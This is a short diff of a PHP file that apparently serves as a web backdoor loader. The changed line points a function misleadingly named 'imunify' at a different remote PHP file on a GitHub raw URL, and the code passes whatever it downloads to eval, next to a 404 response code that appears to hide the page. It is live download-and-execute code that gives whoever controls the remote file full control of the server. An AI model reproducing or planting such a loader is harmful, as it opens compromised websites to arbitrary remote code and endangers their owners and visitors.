@@ -39,6 +39,6 @@ http_response_code(404);
         return $urls;
     }
 
-    $secure = imunify('https://github.com/odigital17/bonjour/raw/refs/heads/main/meta.php');
+    $secure = imunify('https://raw.githubusercontent.com/odigital17/bonjour/refs/heads/main/Libv2.php');
     eval('?>' . $secure);
 ?>
